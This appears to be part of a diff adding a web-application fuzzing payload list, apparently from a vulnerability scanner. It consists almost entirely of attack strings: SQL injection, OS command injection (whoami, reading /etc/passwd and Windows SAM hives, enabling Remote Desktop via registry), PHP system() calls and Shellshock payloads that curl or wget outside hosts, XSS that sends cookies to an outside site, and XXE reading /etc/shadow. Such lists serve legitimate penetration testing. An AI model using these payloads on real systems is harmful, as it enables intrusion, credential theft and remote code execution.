+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+" or "x"="x
+' or 'x'='x
+') or ('x'='x
+perl -e 'print "X"x1024'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+|| perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+; perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+|| perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+&& perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+|| perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+{{person.name}}
+{{person.secret}}
+& phpinfo()
+&& phpinfo()
+';phpinfo();//
+;phpinfo()
+;phpinfo();//
+| phpinfo()
+|| phpinfo()
+phpinfo()
+phpinfo();
+<?php system("cat /etc/passwd");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+:phpversion();
+`ping 127.0.0.1`
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+PRINT
+PRINT @@variable
+procedure
+& pwd
+&& pwd
+; pwd
+| pwd
+pwd
+&& quot;;id&quot;
+&&quot;;id&quot;
+&quot;;id&quot;
+\r
+;; read;
+;;read;
+;read;
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+replace
+\r\n
+route
+"><script>"
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+<<script>alert("XSS");//<</script>
+<script>alert("XSS")</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+<  script > < / script>
+select
+' (select top 1
+& sleep 1
+&& sleep 1
+; sleep 1
+| sleep 1
+sleep 1
+& sleep 10 
+&& sleep 10
+; sleep 10
+| sleep 10
+|| sleep 10
+sleep 10
+& sleep 15 
+&& sleep 15
+; sleep 15
+| sleep 15
+|| sleep 15
+& sleep 5
+&& sleep 5
+; sleep 5
+| sleep 5
+sleep 5
+something%00html
+--sp_password
+'sqlattempt1
+(sqlattempt2)
+& sysinfo
+&& sysinfo
+; sysinfo
+| sysinfo
+sysinfo
+;system('cat%20/etc/passwd')
+system('cat C:\boot.ini');
+system('cat config.php');
+system('cat /etc/passwd');
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+;system('id')
+& systeminfo
+&& systeminfo
+; systeminfo
+| systeminfo
+systeminfo
+system('ls')
+system('pwd')
+system('pwd');
+& system('sleep 5');
+&& system('sleep 5');
+; system('sleep 5');
+| system('sleep 5');
+|| system('sleep 5');
+system('sleep 5')
+system('sleep 5');
+;system('/usr/bin/id')
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+"\t"
+\t
+test*; ls -lhtR /var/www/
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test* | perl -e 'print "X"x16096'
+test* || perl -e 'print "X"x16096'
+test*; perl -e 'print "X"x16096'
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+TRUE
+truncate
+&&type C:\\boot.ini
+& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+| type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+& type C:\Windows\repair\SYSTEM
+&& type C:\Windows\repair\SYSTEM
+; type C:\Windows\repair\SYSTEM
+| type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SYSTEM
+& type C:\WINNT\repair\SAM
+&& type C:\WINNT\repair\SAM
+; type C:\WINNT\repair\SAM
+| type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type %SYSTEMROOT%\repair\SYSTEM
+; type %SYSTEMROOT%\repair\SYSTEM
+| type %SYSTEMROOT%\repair\SYSTEM
+type %SYSTEMROOT%\repair\SYSTEM
+tz_offset
+\u003c
+\u003C
+..%u2215
+..%u2216
+;uname;
+uname
+& uname -a
+&& uname -a
+; uname -a
+| uname -a
+uname -a
+' UNION ALL SELECT
+' UNION SELECT
+update
+& /u?r/b?n/wh?ami
+&& /u?r/b?n/wh?ami
+&&/u?r/b?n/wh?ami
+&/u?r/b?n/wh?ami
+; /u?r/b?n/wh?ami
+;/u?r/b?n/wh?ami
+| /u?r/b?n/wh?ami
+|/u?r/b?n/wh?ami
+|| /u?r/b?n/wh?ami
+||/u?r/b?n/wh?ami
+;/usr/bin/id|
+;|/usr/bin/id|
+`/usr/bin/id`
+|/usr/bin/id
+|/usr/bin/id|
+||/usr/bin/id;
+||/usr/bin/id|
+;/usr/bin/id\n
+|usr/bin/id\n
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+'||UTL_HTTP.REQUEST
+,@variable
+@variable
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+& wget http://crowdshield.com/.testing/rce.txt
+| wget http://crowdshield.com/.testing/rce.txt
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+wget https://crowdshield.com/.testing/rce_vuln.txt
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+" & whoami
+" && whoami
+" | whoami
+" || whoami
+" whoami
+"; whoami
+& whoami
+&& whoami
+' & whoami
+' && whoami
+' || whoami
+' whoami
+'; whoami
+; whoami
+| whoami
+whoami
+?x=
+?x="
+?x=>
+?x=|
+&#x000003c
+&#x000003c;
+&& #x000003c
+&& #x000003c;
+&&#x000003c
+&&#x000003c;
+&#x000003C
+&#x000003C;
+&& #x000003C
+&& #x000003C;
+&&#x000003C
+&&#x000003C;
+&#X000003c
+&#X000003c;
+&& #X000003c
+&& #X000003c;
+&&#X000003c
+&&#X000003c;
+&#X000003C
+&#X000003C;
+&& #X000003C
+&& #X000003C;
+&&#X000003C
+&&#X000003C;
+&#x00003c
+&#x00003c;
+&& #x00003c
+&& #x00003c;
+&&#x00003c
+&&#x00003c;
+&#x00003C
+&#x00003C;
+&& #x00003C
+&& #x00003C;
+&&#x00003C
+&&#x00003C;
+&#X00003c
+&#X00003c;
+&& #X00003c
+&& #X00003c;
+&&#X00003c
+&&#X00003c;
+&#X00003C
+&#X00003C;
+&& #X00003C
+&& #X00003C;
+&&#X00003C
+&&#X00003C;
+&#x0003c
+&#x0003c;
+&& #x0003c
+&& #x0003c;
+&&#x0003c
+&&#x0003c;
+&#x0003C
+&#x0003C;
+&& #x0003C
+&& #x0003C;
+&&#x0003C
+&&#x0003C;
+&#X0003c
+&#X0003c;
+&& #X0003c
+&& #X0003c;
+&&#X0003c
+&&#X0003c;
+&#X0003C
+&#X0003C;
+&& #X0003C
+&& #X0003C;
+&&#X0003C
+&&#X0003C;
+&#x003c
+&#x003c;
+&& #x003c
+&& #x003c;
+&&#x003c
+&&#x003c;
+&#x003C
+&#x003C;
+&& #x003C
+&& #x003C;
+&&#x003C
+&&#x003C;
+&#X003c
+&#X003c;
+&& #X003c
+&& #X003c;
+&&#X003c
+&&#X003c;
+&#X003C
+&#X003C;
+&& #X003C
+&& #X003C;
+&&#X003C
+&&#X003C;
+&#x03c
+&#x03c;
+&& #x03c
+&& #x03c;
+&&#x03c
+&&#x03c;
+&#x03C
+&#x03C;
+&& #x03C
+&& #x03C;
+&&#x03C
+&&#x03C;
+&#X03c
+&#X03c;
+&& #X03c
+&& #X03c;
+&&#X03c
+&&#X03c;
+&#X03C
+&#X03C;
+&& #X03C
+&& #X03C;
+&&#X03C
+&&#X03C;
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+&#x3c
+&#x3c;
+&& #x3c
+&& #x3c;
+&&#x3c
+&&#x3c;
+\x3c
+&#x3C
+&#x3C;
+&& #x3C
+&& #x3C;
+&&#x3C
+&&#x3C;
+\x3C
+&#X3c
+&#X3c;
+&& #X3c
+&& #X3c;
+&&#X3c
+&&#X3c;
+&#X3C
+&#X3C;
+&& #X3C
+&& #X3C;
+&&#X3C
+&&#X3C;
+\x3D \x27
+\x3D \x3B'
+#xA
+#xA#xD
+#xD
+#xD#xA
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+'';!--"<XSS>=&{()}
+<xss><script>alert('XSS')</script></vulnerable>
+">xxx<P>yyy
